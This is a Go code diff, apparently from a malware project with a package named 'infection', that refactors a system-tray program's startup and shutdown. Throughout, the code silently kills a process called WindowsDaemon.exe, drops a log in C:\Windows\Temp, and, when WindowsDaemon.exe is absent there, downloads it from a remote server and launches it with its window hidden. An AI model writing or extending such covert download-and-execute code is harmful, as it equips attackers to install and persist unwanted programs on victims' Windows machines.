@@ -12,7 +12,6 @@ import (
 	"infection/util/lib"
 	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"os/exec"
 	"strconv"
@@ -20,9 +19,6 @@ import (
 	"syscall"
 	"systray"
 )
-
-const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
-const CURRENTPATH = "C:\\Windows\\Temp\\"
 
 var localAddr string
 
@@ -88,37 +84,26 @@ func onReady() {
 	}
 }
 func onExit() {
-	// clean up here
-	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
-	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	// not Start will continue
-	killcheck.Run()
+	lib.KillCheck()
 }
 func init() {
-	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
-	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	// not Start will continue
-	killcheck.Run()
+	lib.KillCheck()
 	//currentprogram path log
 	content, _ := transfer.GetTargetPath()
 	data := []byte(content)
-	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
+	if ioutil.WriteFile(lib.CURRENTPATHLOG, data, 0644) == nil {
 	}
 	//fixed ioop download check
-	_, cerr := os.Stat(CURRENTPATH + "WindowsDaemon.exe")
+	_, cerr := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
 	if cerr != nil {
 		//keep the main process live
-		resp, err := http.Get(lib.MIDFILE + "WindowsDaemon.exe")
-		if err != nil {
-			return
-		}
-		body, _ := ioutil.ReadAll(resp.Body)
-		ioutil.WriteFile(CURRENTPATH+"WindowsDaemon.exe", body, 0644)
-		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
+		lib.MultiFileDown([]string{}, "init")
+
+		cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd.Start()
 	} else {
-		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
+		cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd.Start()
 	}
